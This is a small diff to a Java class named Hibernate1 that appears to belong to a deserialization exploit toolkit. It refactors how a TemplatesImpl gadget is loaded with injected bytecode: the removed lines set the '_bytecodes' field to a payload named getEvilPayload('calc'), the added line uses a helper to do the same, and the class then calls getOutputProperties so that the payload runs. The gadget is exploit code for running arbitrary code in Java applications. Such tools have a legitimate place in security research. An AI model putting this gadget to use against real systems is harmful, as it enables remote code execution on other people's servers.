@@ -32,11 +32,7 @@ public class Hibernate1 {
      * @param args
      */
     public static void main(String[] args) throws Exception {
-        byte[] bytes = Utils.getEvilPayload("calc");
-        TemplatesImpl templates = new TemplatesImpl();
-        Utils.setValue(templates , "_bytecodes", new byte[][]{bytes});
-        Utils.setValue(templates , "_name", "gadgets");
-        Utils.setValue(templates , "_tfactory", new TransformerFactoryImpl());
+        TemplatesImpl templates = Utils.createTemplatesImpl("calc");
 
         Method method = templates.getClass().getMethod("getOutputProperties");
 
